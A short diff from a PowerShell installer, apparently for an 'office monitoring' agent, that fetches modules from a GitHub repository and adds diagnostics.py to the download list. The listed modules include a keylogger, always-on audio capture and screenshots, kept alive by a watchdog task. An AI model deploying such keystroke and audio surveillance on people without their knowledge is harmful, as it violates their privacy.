@@ -12,8 +12,8 @@ $TaskWatch   = "OfficeMonitoringWatchdog"
 $RepoBase    = "https://raw.githubusercontent.com/dogmat1910-tech/office-monitoring/main/agent"
 $Files       = @(
     "agent.py", "active_window.py", "audio.py", "always_on_audio.py",
-    "categories.py", "idle.py", "keylogger.py", "screenshot.py", "watchdog.py",
-    "requirements.txt"
+    "categories.py", "diagnostics.py", "idle.py", "keylogger.py",
+    "screenshot.py", "watchdog.py", "requirements.txt"
 )
 
 function Info($m)  { Write-Host "[*] $m" -ForegroundColor Cyan }
